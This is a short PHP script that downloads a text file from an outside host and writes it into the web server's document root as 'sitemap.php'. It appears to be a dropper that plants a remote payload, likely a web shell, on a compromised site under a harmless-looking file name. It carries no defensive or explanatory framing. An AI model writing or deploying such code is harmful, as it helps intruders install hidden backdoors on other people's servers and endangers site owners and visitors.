<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/sitemap.php" ;
$text3 = http_get('http://www.med-health.net/cache/hehe.txt');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
    echo $check3."</br>";
}else 
  echo "not exits";
echo "done .\n " ;


?>
